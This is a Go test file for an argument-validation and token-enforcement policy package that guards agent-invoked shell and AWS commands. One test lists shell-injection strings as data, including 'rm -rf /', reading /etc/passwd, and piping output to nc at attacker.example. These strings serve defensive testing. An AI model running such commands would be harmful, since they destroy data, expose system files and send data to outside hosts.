package policy_test

import (
	"errors"
	"testing"

	"github.com/coilysiren/coily/pkg/policy"
)

func TestValidateArg_AcceptsSafeStrings(t *testing.T) {
	cases := []string{
		"",
		"simple",
		"with-hyphens",
		"with.dots",
		"with/slashes",
		"with:colons",
		"Mixed_Case",
		"/path/to/thing.yaml",
		"arn:aws:iam::1234:user/kai-mac-laptop",
		"Z06714552N3MO04UBWF33",
		"https://github.com/coilysiren/coily",
		"/eco/server-api-token",
	}
	for _, c := range cases {
		if err := policy.ValidateArg("test", c); err != nil {
			t.Errorf("ValidateArg(%q) = %v, want nil", c, err)
		}
	}
}

func TestValidateArg_RejectsEveryShellMetacharacter(t *testing.T) {
	for _, r := range policy.ShellMeta {
		value := "ok" + string(r) + "bad"
		err := policy.ValidateArg("test", value)
		if err == nil {
			t.Errorf("ValidateArg(%q) = nil, want error (char %q)", value, r)
			continue
		}
		if !errors.Is(err, policy.ErrShellMeta) {
			t.Errorf("ValidateArg(%q): err = %v, want ErrShellMeta", value, err)
		}
	}
}

func TestValidateArg_RejectsInjectionAttempts(t *testing.T) {
	// Real-world shapes an agent might synthesize.
	cases := []string{
		"foo; rm -rf /",
		"foo && cat /etc/passwd",
		"foo | nc attacker.example 4444",
		"$(whoami)",
		"`whoami`",
		"foo > /tmp/out",
		"foo \n rm -rf /",
	}
	for _, c := range cases {
		if err := policy.ValidateArg("test", c); err == nil {
			t.Errorf("ValidateArg(%q) accepted injection attempt", c)
		}
	}
}

func TestValidateArgs_FirstViolationWins(t *testing.T) {
	args := map[string]string{
		"safe":   "ok",
		"unsafe": "foo;bar",
	}
	if err := policy.ValidateArgs(args); err == nil {
		t.Error("ValidateArgs accepted unsafe input")
	}
}

func TestValidateArgSlice_IncludesIndexInErrorMessage(t *testing.T) {
	err := policy.ValidateArgSlice("pos", []string{"ok", "bad;injection"})
	if err == nil {
		t.Fatal("expected error")
	}
	msg := err.Error()
	if want := "pos[1]"; !contains(msg, want) {
		t.Errorf("error = %q, want it to contain %q", msg, want)
	}
}

type fakeVerifier struct{ ok bool }

func (f fakeVerifier) Verify(_, _ string) error {
	if f.ok {
		return nil
	}
	return errors.New("bad token")
}

func TestEnforce_ReadOnlyAllowsMissingToken(t *testing.T) {
	inv := policy.Invocation{
		Verb: "aws.sts.get-caller-identity",
		Kind: policy.ReadOnly,
		Args: map[string]string{"--profile": "default"},
	}
	if err := policy.Enforce(inv, nil); err != nil {
		t.Errorf("Enforce readonly: %v", err)
	}
}

func TestEnforce_MutatingRejectsMissingToken(t *testing.T) {
	inv := policy.Invocation{
		Verb: "aws.route53.change-resource-record-sets",
		Kind: policy.Mutating,
		Args: map[string]string{"--hosted-zone-id": "Z123"},
	}
	err := policy.Enforce(inv, fakeVerifier{ok: true})
	if !errors.Is(err, policy.ErrTokenRequired) {
		t.Errorf("Enforce mutating without token: err = %v, want ErrTokenRequired", err)
	}
}

func TestEnforce_MutatingRejectsBadToken(t *testing.T) {
	inv := policy.Invocation{
		Verb:  "aws.route53.change-resource-record-sets",
		Kind:  policy.Mutating,
		Token: "garbage",
	}
	err := policy.Enforce(inv, fakeVerifier{ok: false})
	if err == nil {
		t.Error("Enforce accepted bad token")
	}
}

func TestEnforce_MutatingAcceptsValidToken(t *testing.T) {
	inv := policy.Invocation{
		Verb:  "aws.route53.change-resource-record-sets",
		Kind:  policy.Mutating,
		Token: "valid",
		Args:  map[string]string{"--hosted-zone-id": "Z123"},
	}
	if err := policy.Enforce(inv, fakeVerifier{ok: true}); err != nil {
		t.Errorf("Enforce with valid token: %v", err)
	}
}

func TestEnforce_MutatingNoVerifierIsError(t *testing.T) {
	inv := policy.Invocation{
		Verb:  "aws.route53.change-resource-record-sets",
		Kind:  policy.Mutating,
		Token: "something",
	}
	err := policy.Enforce(inv, nil)
	if !errors.Is(err, policy.ErrTokenRequired) {
		t.Errorf("Enforce with nil verifier: err = %v, want ErrTokenRequired", err)
	}
}

func TestEnforce_ArgsValidatedBeforeTokenCheck(t *testing.T) {
	// A mutating verb with both a missing token AND a bad arg should report
	// the bad arg first. This keeps error messages deterministic and keeps
	// the easier check from eclipsing the harder one.
	inv := policy.Invocation{
		Verb: "aws.route53.change-resource-record-sets",
		Kind: policy.Mutating,
		Args: map[string]string{"--zone": "Z123;rm"},
	}
	err := policy.Enforce(inv, nil)
	if !errors.Is(err, policy.ErrShellMeta) {
		t.Errorf("err = %v, want ErrShellMeta", err)
	}
}

func contains(s, sub string) bool {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}
